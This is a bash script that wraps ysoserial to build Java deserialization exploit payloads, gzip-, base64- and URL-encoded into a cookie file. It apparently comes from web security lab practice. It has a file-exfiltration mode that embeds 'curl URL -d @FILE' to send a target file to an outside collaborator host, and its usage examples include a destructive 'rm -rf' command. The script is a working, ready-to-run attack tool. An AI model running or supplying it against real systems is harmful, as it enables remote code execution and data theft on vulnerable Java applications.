#!/usr/bin/env bash
set -euo pipefail

# ============================
#   ANSI COLORS
# ============================
RED="\e[31m"
GREEN="\e[32m"
YELLOW="\e[33m"
CYAN="\e[36m"
RESET="\e[0m"

# ============================
#   Usage + Args
# ============================
if [[ $# -lt 2 || $# -gt 3 ]]; then
    echo -e "${YELLOW}Usage:${RESET}"
    echo "  $0 <GADGET> <COMMAND>"
    echo "  $0 <GADGET> <FILE> <URL>"
    echo
    echo -e "${CYAN}Examples:${RESET}"
    echo "  $0 CommonsCollections4 \"rm -rf /tmp/test\""
    echo "  $0 CommonsCollections1 \"/home/carlos/secret\" \"https://abc123.burpcollaborator.net\""
    exit 1
fi

GADGET="$1"
JAR="${YSOSERIAL_JAR:-./ysoserial-all.jar}"

# Output files
RAW_PAYLOAD="payload.bin"
GZIPPED_PAYLOAD="payload.gz"
BASE64_PAYLOAD="payload.b64"
URLENCODED_PAYLOAD="payload.url.txt"

OUT_FILE="${OUT_FILE:-cookie.txt}"

# ============================
#   Decide mode
# ============================
if [[ $# -eq 2 ]]; then
    COMMAND="$2"
    echo -e "${CYAN}[*] Mode:${RESET} Direct COMMAND"
elif [[ $# -eq 3 ]]; then
    FILE="$2"
    URL="$3"
    COMMAND="curl $URL -d @$FILE"
    echo -e "${CYAN}[*] Mode:${RESET} File exfiltration → curl $URL -d @$FILE"
fi

# ============================
#   Check ysoserial
# ============================
if [[ ! -f "$JAR" ]]; then
    echo -e "${RED}[!] Error: ysoserial JAR not found: $JAR${RESET}"
    exit 1
fi

# Remove weird Java env overrides
JAVA_ENV=(env -u _JAVA_OPTIONS -u JAVA_TOOL_OPTIONS)

# ============================
#   GENERATE PAYLOAD
# ============================
echo -e "${YELLOW}[*] Generating ysoserial payload...${RESET}"

"${JAVA_ENV[@]}" \
java \
    --add-exports=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
    --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
    --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
    --add-opens=java.base/java.net=ALL-UNNAMED \
    --add-opens=java.base/java.util=ALL-UNNAMED \
    -jar "$JAR" "$GADGET" "$COMMAND" \
    > "$RAW_PAYLOAD"

echo -e "${YELLOW}[*] Compressing with gzip...${RESET}"
gzip -c "$RAW_PAYLOAD" > "$GZIPPED_PAYLOAD"

echo -e "${YELLOW}[*] Base64 encoding...${RESET}"
base64 -w 0 "$GZIPPED_PAYLOAD" > "$BASE64_PAYLOAD"

echo -e "${YELLOW}[*] URL encoding...${RESET}"
python3 -c "import urllib.parse; print(urllib.parse.quote(open('$BASE64_PAYLOAD').read()))" \
    > "$URLENCODED_PAYLOAD"

cp "$URLENCODED_PAYLOAD" "$OUT_FILE"

# ============================
#   DONE
# ============================
echo
echo -e "${GREEN}[+] Payload generation complete!${RESET}"
echo -e "${CYAN}[+] Raw:        ${RESET}$RAW_PAYLOAD"
echo -e "${CYAN}[+] Gzip:       ${RESET}$GZIPPED_PAYLOAD"
echo -e "${CYAN}[+] Base64:     ${RESET}$BASE64_PAYLOAD"
echo -e "${CYAN}[+] URL-encoded:${RESET} $URLENCODED_PAYLOAD"
echo -e "${CYAN}[+] Final OUT_FILE:${RESET} $OUT_FILE"
echo

# ============================
#   SHOW OUT_FILE CONTENT
# ============================
echo -e "${GREEN}[+] Output content (${OUT_FILE}):${RESET}"
cat "$OUT_FILE"
echo
